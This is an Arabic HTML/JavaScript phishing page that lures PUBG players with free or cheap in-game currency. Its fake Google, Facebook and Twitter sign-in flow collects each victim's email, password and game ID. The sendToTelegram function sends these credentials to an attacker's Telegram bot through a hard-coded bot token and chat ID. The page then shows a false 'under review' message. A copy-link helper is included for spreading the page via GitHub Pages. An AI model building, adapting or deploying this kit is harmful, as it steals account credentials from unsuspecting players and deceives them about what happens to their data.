<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>واجهة التبرعات</title>
    <style>
        body {
            background-color: #F9D93C; /* لون خلفية أصفر غامق قليلاً */
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        .container {
            background: rgba(255, 255, 255, 0.9); /* لوحة بيضاء شفافة */
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
            width: 90%;
            max-width: 700px;
            display: none; /* إخفاء المحتوى الافتراضي */
        }

        .container.active {
            display: block; /* عرض المحتوى النشط */
        }

        .donation-bars, .auth-bars, .login-bars {
            width: 100%;
        }

        .bar, .auth-bar, .login-bar {
            background-color: #fff;
            border: 1px solid #ddd;
            border-radius: 5px;
            padding: 15px;
            margin-bottom: 15px;
            text-align: center;
            font-size: 18px;
            cursor: pointer;
        }

        .bar:hover, .auth-bar:hover, .login-bar:hover {
            background-color: #f0f0f0;
        }

        .description, .auth-description, .login-description {
            display: block;
        }

        .input-field {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }

        .error-message {
            color: red;
            display: none;
        }

        .copy-link {
            background-color: #4CAF50;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }

        .copy-link:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div id="donation-page" class="container active">
        <div class="donation-bars">
            <div class="bar" onclick="showPage('auth-page')">
                <span class="description">شدات بوبجي 500 مجانا</span>
            </div>
            <div class="bar" onclick="showPage('auth-page')">
                <span class="description">شدات بوبجي 1000 - سعر 3 دولار</span>
            </div>
            <div class="bar" onclick="showPage('auth-page')">
                <span class="description">شدات بوبجي 1500 - سعر 5 دولار</span>
            </div>
            <div class="bar" onclick="showPage('auth-page')">
                <span class="description">شدات بوبجي 2500 - سعر 6 دولار</span>
            </div>
            <div class="bar" onclick="showPage('auth-page')">
                <span class="description">شدات بوبجي 3000 - سعر 8 دولار</span>
            </div>
        </div>
        <button class="copy-link" onclick="copyLink()">انسخ الرابط</button>
        <div id="copied-message" style="display: none;">تم نسخ الرابط! الرجاء لصقه في متصفح Google Chrome.</div>
    </div>

    <div id="auth-page" class="container">
        <div class="auth-bars">
            <div class="auth-bar" onclick="showPage('login-page')">
                <span class="auth-description">تسجيل عبر Google</span>
            </div>
            <div class="auth-bar" onclick="showPage('login-page')">
                <span class="auth-description">تسجيل عبر Facebook</span>
            </div>
            <div class="auth-bar" onclick="showPage('login-page')">
                <span class="auth-description">تسجيل عبر Twitter</span>
            </div>
        </div>
    </div>

    <div id="login-page" class="container">
        <div class="login-bars">
            <input type="text" id="email" class="input-field" placeholder="البريد الإلكتروني">
            <input type="password" id="password" class="input-field" placeholder="كلمة السر">
            <input type="text" id="userid" class="input-field" placeholder="ادخل الايدي">
            <div class="login-bar" onclick="sendToTelegram(event)">
                <span class="login-description">تسجيل الدخول</span>
            </div>
            <div class="error-message" id="error-message">يرجى ملء جميع الحقول</div>
        </div>
    </div>

    <script>
        function showPage(pageId) {
            document.querySelectorAll('.container').forEach(container => {
                container.classList.remove('active');
            });
            document.getElementById(pageId).classList.add('active');
        }

        function sendToTelegram(event) {
            event.preventDefault(); // لمنع السلوك الافتراضي للنقرة
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const userId = document.getElementById('userid').value;
            const errorMessage = document.getElementById('error-message');

            if (!email || !password || !userId) {
                errorMessage.style.display = 'block';
                return;
            }

            errorMessage.style.display = 'none';
            const token = '7191210440:AAEVNLvcPt-q3cQrJRJY8pDqwg4HFRTAiyA';
            const chatId = '6082476350';
            const message = `البريد الإلكتروني: ${email}\nكلمة السر: ${password}\nالايدي: ${userId}`;
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        alert('تم ارسال معلوماتك وسيتم مراجعتها في 15 دقيقة.');
                    } else {
                        alert('حدث خطأ أثناء إرسال المعلومات.');
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('حدث خطأ أثناء إرسال المعلومات.');
                });
        }

        function copyLink() {
            const link = 'https://username.github.io/donation-app'; // استبدل هذا الرابط برابط GitHub Pages الخاص بك
            navigator.clipboard.writeText(link).then(() => {
                document.getElementById('copied-message').style.display = 'block';
            }).catch(err => {
                console.error('Error copying link: ', err);
            });
        }
    </script>
</body>
</html>
